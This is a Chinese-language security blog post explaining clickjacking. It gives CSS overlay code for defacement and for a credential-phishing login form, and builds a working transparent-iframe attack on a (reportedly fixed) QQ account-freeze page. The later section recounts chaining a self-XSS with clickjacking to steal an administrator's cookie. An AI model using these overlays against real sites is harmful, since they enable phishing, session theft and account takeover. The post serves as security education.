<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>鸡肋点搭配ClickJacking攻击-获取管理员权限 · Chen's Blog</title> <meta name="description" content="前言"> <meta name="keywords" content="前言"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400;1,700&display=swap" rel="stylesheet"> <link rel="stylesheet" href="/assets/css/highlight/github.min.css" id="highlight-light"> <link rel="stylesheet" href="/assets/css/highlight/github-dark.min.css" id="highlight-dark" disabled> <link rel="stylesheet" href="/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2017-12-20/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> <script> window.giscusThemeConfig = { light: "light_protanopia", dark: "dark_tritanopia" }; </script> <script src="/assets/js/theme.js"></script> </head> <body> <button class="theme-toggle" id="themeToggle" aria-label="Switch Theme"> <!-- 太阳图标 (在深色模式显示) --> <svg id="icon-sun" viewBox="0 0 24 24"> <path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2c.55 0 1-.45 1-1s-.45-1-1-1H2c-.55 0-1 .45-1 1s.45 1 1 1zm18 0h2c.55 0 1-.45 1-1s-.45-1-1-1h-2c-.55 0-1 .45-1 1s.45 1 1 1zM11 2v2c0 .55.45 1 1 1s1-.45 1-1V2c0-.55-.45-1-1-1s-1 .45-1 1zm0 18v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1s-1 .45-1 1zM5.99 4.58c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41L5.99 4.58zm12.37 12.37c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0 .39-.39.39-1.03 0-1.41l-1.06-1.06zm1.06-10.96c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06zM7.05 18.36c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06z" /> </svg> <!-- 月亮图标 (在亮色模式显示) --> <svg id="icon-moon" viewBox="0 0 24 24" style="display: none"> <path d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.16,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.06,6.83,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z" /> </svg> </button> <div class="author-section"> <a href="/" class="author-avatar-link"> <img src="/assets/avatar.jpg" class="author-avatar" alt="Author Avatar" /> </a> <h1 class="author-title">EvilChen</h1> <div class="divider"></div> <nav class="author-nav"> <a href="/about">About Me</a> <span class="separator">|</span> <a href="/friends">My Friends</a> </nav> <div class="divider"></div> </div> <div id="content"> <article> <div class="center"> <h1 class="title">鸡肋点搭配ClickJacking攻击-获取管理员权限</h1> <time class="code">December 20, 2017</time> </div> <div class="divider"></div> <div class="prose"> <h1 id="前言">前言</h1> <p>有一段时间没做测试了，偶尔的时候也会去挖挖洞。本文章要写的东西是我利用<code>ClickJacking</code>拿下管理员权限的测试过程。但在说明过程之前，先带大家了解一下<code>ClickJacking</code>的<strong>基本原理以及简单的漏洞挖掘</strong>。</p> <h1 id="clickjacking">ClickJacking</h1> <p>ClickJacking背景说明:</p> <blockquote> <p>ClickJacking（点击劫持）是由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼在2008年首创的。 ClickJacking是一种视觉欺骗攻击手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情(被欺骗)的情况下，点击攻击者想要欺骗用户点击的位置。</p> </blockquote> <p>说道视觉欺骗，相信有<code>炫技</code>经验的朋友们一定会想到，自己一个后台拿不下Webshell权限的时候，而想要黑掉首页从而达到炫技，使用的是什么呢？没错一般使用CSS样式表来劫持首页以造成黑掉的假象~</p><pre><code class="language-html">&lt;table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"&gt;&lt;h1&gt;hacked by key&lt;/h1&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
</code></pre><p><img src="/images/2017-12-20/0x00.png" alt="CSS jacking" /></p> <p>除了可以炫技，CSS劫持可以做的东西也有很多：例如经典的form表单钓鱼攻击</p><pre><code class="language-html">&lt;table+style="left:+0px;+top:+0px;+position:+fixed;z-index:+5000;position:absolute;width:100%;background-color:white;"&gt;&lt;tr&gt;&lt;td&gt;&lt;form action="http://192.168.0.109/login.php" method="post"&gt;账号：&lt;input type="text" name="name"&gt;&lt;br&gt;密码：&lt;input type="password" name="pwd"&gt;&lt;br&gt;&lt;input type="submit" value="登陆"&gt;&lt;/form&gt;&lt;td&gt;&lt;/tr&gt;&lt;/table&gt;
</code></pre><p><img src="/images/2017-12-20/0x01.png" alt="CSS jacking" /></p> <p>这里就不对代码的意思进行解读了，可以看到CSS劫持达到的视觉欺骗攻击效果还是比较LOW的，因为这样的攻击手段偏被动式。而我要说的点击劫持其实也算是被动式，不过相对来说比较容易获得信任让被动式触发，这里只是单单对攻击手法谁的成功率比较高作为比较</p> <p>前面背景介绍的时候说了，点击劫持攻击其实就是镶嵌一个iframe框架(<strong>存在点击劫持漏洞的页面</strong>)在页面上，然后再把其修改为透明的样式。这样的操作只是造成了视觉欺骗，还没达到欺骗点击的效果，所以就需要知道iframe框架其按钮的位置，然后在基于透明层模拟一个位置大小相同的按钮，发给用户让其点击~~</p> <p>这里以QQ安全中心的一个点击劫持为例，作为一个QQ的资深用户应该知道QQ是有安全中心紧急冻结QQ服务的，只要登录自己的安全中心就可以冻结，<strong>地址(漏洞地址，目前漏洞已经修复)</strong>为：<a href="https://aq.qq.com/cn2/message_center/wireless/wireless_seal_auth?source_id=2985">https://aq.qq.com/cn2/message_center/wireless/wireless_seal_auth?source_id=2985</a></p> <p><img src="/images/2017-12-20/0x02.png" alt="QQ Click Jacking" /></p> <p>一点击，你的QQ就被会冻结(当时不知道逗了多少人~)，那这样怎么利用呢？</p> <p>1.建立iframe框架:</p><pre><code class="language-html">&lt;iframe id="frame" src="https://aq.qq.com/cn2/message_center/wireless/wireless_seal_auth?source_id=2985"&gt;&lt;/iframe&gt;
</code></pre><p>2.建立iframe的CSS样式:</p><pre><code class="language-css">#frame {
    border: 0px; /*边框属性为0*/
    height: 100%; /*框架高度100%*/
    width: 100%; /*框架宽度100%*/
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
</code></pre><p>3.获取iframe框架引用的原页面的按钮位置和大小:</p> <p>大小直接通过审查元素可以看得到:</p> <p><img src="/images/2017-12-20/0x03.png" alt="QQ Click Jacking" /></p> <p>现在要获取的就是按钮元素到浏览器顶部的距离，这里通过<code>id.offsetTop</code>有些时候是无法直接获取的:</p> <blockquote> <p>&gt;&gt;span_verify.offsetTop ←16</p> </blockquote> <p>获取到的是16~很醉，所以使用如下的方法直接获取:</p><pre><code class="language-javascript">document.getElementById('span_verify').getBoundingClientRect().top
</code></pre><p><img src="/images/2017-12-20/0x04.png" alt="QQ Click Jacking" /> 4.建立按钮:</p><pre><code class="language-html">&lt;input type="button" class="button" value="Click" /&gt;
</code></pre><p>5.根据第三步骤获取到的建立按钮样式:</p><pre><code class="language-css">.button {
    position: fixed;
    width: 100%;
    height: 42px;
    margin: 0 auto;
    left: 0;
    right: 0;
    display: block;
    top: 278px;
} 
</code></pre><p>6.散播，用户中招: <img src="/images/2017-12-20/0x05.png" alt="QQ Click Jacking" /> <img src="/images/2017-12-20/0x06.png" alt="QQ Click Jacking" /></p> <h2 id="一次点击劫持攻击案例">一次点击劫持攻击案例</h2> <p>说了这么多，在前几天的测试中我是如何拿到管理员权限呢？挖掘到一处self-xss，这里先说明下self-xss可以理解为只能攻击myself~</p> <p>发现流程:</p> <p><strong>发现输入框-&gt;秉着见框就X的原理插入XSS Payload-&gt;弹框-&gt;发现成功</strong></p> <p>然而获取到的URL链接是<code>/?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</code>，但是不是xss，keyword的值显示在输入框内，需要你再点击<code>搜索标题按钮</code>才可以触发漏洞。</p> <p><strong>形成的攻击思路-&gt;iframe嵌套漏洞URL链接-&gt;Click Jacking攻击页面构造-&gt;通过留言给管理员引诱触发</strong></p> <p><img src="/images/2017-12-20/0x07.png" alt="Click Jacking" /></p> <p>攻击页面构造流程其实耐心读到这里的朋友已经是非常明确步骤了:</p> <p><strong>建立iframe框架-&gt;建立iframe框架CSS样式-&gt;获取按钮位置大小-&gt;建立按钮-&gt;建立按钮CSS样式-&gt;留言板留言外网攻击链接-&gt;获取管理员Cookie-&gt;Cookie伪造进入后台</strong></p> <h1 id="结尾">结尾</h1> <p>一次很有意思的实践，让自己满满的成就感，同时也完成了项目任务~</p> </div> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2018-02-12/1" title="NEXT: OAuth2.0认证缺陷-第三方帐号快捷登录授权劫持漏洞">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2017-03-29/1" title="PREV: 文件寄生——NTFS文件流实际应用">&gt;&gt;</a> </div> <div class="comments"> <div id="giscus-container" class="giscus"></div> <script> (function() { const getTheme = () => { try { const savedTheme = localStorage.getItem('theme'); if (savedTheme) { return savedTheme; } } catch (e) {} if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) { return 'dark'; } const hour = new Date().getHours(); return (hour >= 6 && hour < 18) ? 'light' : 'dark'; }; const theme = getTheme(); const giscusTheme = theme === 'dark' ? 'dark_tritanopia' : 'light_protanopia'; const script = document.createElement('script'); script.src = "https://giscus.app/client.js"; script.setAttribute("data-repo", "gh0stkey/gh0stkey.github.io"); script.setAttribute("data-repo-id", "MDEwOlJlcG9zaXRvcnkzODc5NzEyMzU="); script.setAttribute("data-category", "Announcements"); script.setAttribute("data-category-id", "DIC_kwDOFx_4o84CyCUA"); script.setAttribute("data-mapping", "title"); script.setAttribute("data-strict", "0"); script.setAttribute("data-reactions-enabled", "0"); script.setAttribute("data-emit-metadata", "0"); script.setAttribute("data-input-position", "top"); script.setAttribute("data-lang", "zh-CN"); script.setAttribute("data-theme", giscusTheme); script.setAttribute("crossorigin", "anonymous"); script.async = true; document.getElementById('giscus-container').appendChild(script); })(); </script> </div> </div> <div class="footer"> <span class="block" >&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span > </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script src="/assets/js/toc.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5" ></script> <script src="/assets/js/pangu/pangu.umd.js"></script> <script> document.addEventListener("DOMContentLoaded", () => { const proseElement = document.querySelector(".prose"); if (proseElement) { pangu.spacingNode(proseElement); } }); </script> <script> $(document).ready(function () { $("article img").each(function () { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html( "&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + new Date().getFullYear(), ); }); $("#imgid").fancybox({ openEffect: "elastic", closeEffect: "elastic", }); </script> <script src="/assets/js/highlight/highlight.min.js"></script> <script> document.addEventListener('DOMContentLoaded', function() { document.querySelectorAll('pre code[class*="language-"]').forEach(block => { hljs.highlightElement(block); }); }); const toggleHighlightTheme = () => { const theme = document.documentElement.getAttribute('data-theme'); const lightCss = document.getElementById('highlight-light'); const darkCss = document.getElementById('highlight-dark'); if (theme === 'dark') { lightCss.disabled = true; darkCss.disabled = false; } else { lightCss.disabled = false; darkCss.disabled = true; } }; document.addEventListener('DOMContentLoaded', toggleHighlightTheme); const observer = new MutationObserver(toggleHighlightTheme); observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-theme'] }); </script> </body> </html>
